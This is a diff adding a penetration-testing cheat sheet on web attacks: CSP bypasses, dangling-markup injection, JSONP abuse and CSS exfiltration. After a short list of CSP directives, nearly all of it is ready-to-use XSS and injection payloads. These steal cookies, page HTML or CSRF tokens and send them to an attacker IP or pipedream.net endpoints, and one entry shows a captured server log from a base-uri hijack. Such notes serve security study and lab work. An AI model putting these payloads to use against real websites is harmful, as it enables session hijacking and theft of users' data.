@@ -1,0 +1,123 @@
+### CSP ###
+## links
+https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
+https://csp-evaluator.withgoogle.com/
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
+https://tryhackme.com/room/csp
+https://report-uri.com/home/generate
+
+
+## enum
+# check header
+# or html meta
+<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none';">
+
+default-src - Default, if a certain resource is trying to be loaded
+              and there isn't a directive, it falls back to default-src to verify if it's allowed to load.
+script-src  - Specifies the sources wherefrom JavaScript scripts can be loaded and executed.
+connect-src - Specifies locations can JavaScript code perform AJAX requests (think XMLHTTPRequest or fetch).
+style-src
+img-src
+font-src    - Locations of fonts
+media-src   - Specify from which locations CSS, images, fonts and media files can be loaded
+frame-src   - use of frame or iframe tag
+child-src   - Defines which locations can be embedded on the webpage via (i)frames.
+report-uri  - Instruct browser report violations of your CSP via a POST request to a particular URL.
+
+
+## bypass
+# 'unsafe-inline'
+<script src="data:application/javascript,alert(1)"></script>
+<script src="data:application/javascript,fetch(`http://10.8.98.114/${document.cookie}`)"></script>
+<img src="x" onerror='window.location.href="//xxx.m.pipedream.net/?t=".concat(btoa(document.xxx.innerHTML))/>
+
+# connect-src *
+<script>fetch(`http://10.8.98.114/${document.cookie}`)</script>
+
+# media-src *
+<script>(new Image()).src = `http://10.8.98.114/${encodeURIComponent(document.cookie)}`</script>
+<script nonce="abcdef">(new Image()).src = `http://10.8.98.114/${encodeURIComponent(document.cookie)}`</script>
+
+# nonce-abcdef (guessable)
+<script nonce="abcdef">fetch(`http://10.8.98.114/${document.cookie}`)</script>
+<link id="csp" rel=stylesheet href=""/><script>document.getElementById('csp').href="http://10.8.98.114/"+document.cookie;</script>
+<script nonce="deOUFHEofoizef==">location=`http://xxx.m.pipedream.net/?t=`%2Bwindow["docu"%2B"ment"]["cookie"]</script>
+
+# unsage-eval
+<script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='http://10.8.98.114/'.concat(document.cookie))"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
+	<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };(new Image()).src = `http://10.8.98.114/${encodeURIComponent(document.cookie)}`;//');}} </div>
+
+# audio
+<script src="/'; new Audio('http://10.8.98.114/' + document.cookie); '"></script>
+
+# base-uri
+cat color.js 
+	window.location.href='http://eozppby15cb3qha.m.pipedream.net/?t='.concat(btoa(document.cookie));
+python -m http.server 4444
+	Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+	102.113.9.219 - - [19/Feb/2024 10:13:13] "GET /web-client/ch62/color.js HTTP/1.1" 200 -
+<base href="http://IP:4444"/>
+
+
+
+#######################
+### Dangling markup ###
+#######################
+## https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
+## scriptless injection, keep char ' opened
+# every src is 'none'
+http://domain/page?user=<meta http-equiv="refresh" content='0; url=http://xxx.m.pipedream.net/log.php?text=
+
+# prefetch-src available
+http://domain/page?user=<link rel="prefetch" href='http://xxx.m.pipedream.net/log.php?text=
+
+
+
+#############
+### JSONP ###
+#############
+## https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt
+# google
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+
+# defer (wait page to load)
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=(location.href=`http://xxx.m.pipedream.net/?t=`.concat(btoa(document.all[0].innerHTML)))" defer></script>
+
+
+
+#################
+### CSS exfil ###
+#################
+## https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#css-injection
+input[name=csrf][value^=a]{
+    background-image: url(https://attacker.com/exfil/a);
+}
+input[name=csrf][value^=b]{
+    background-image: url(https://attacker.com/exfil/b);
+}
+/* ... */
+input[name=csrf][value^=9]{
+    background-image: url(https://attacker.com/exfil/9);   
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
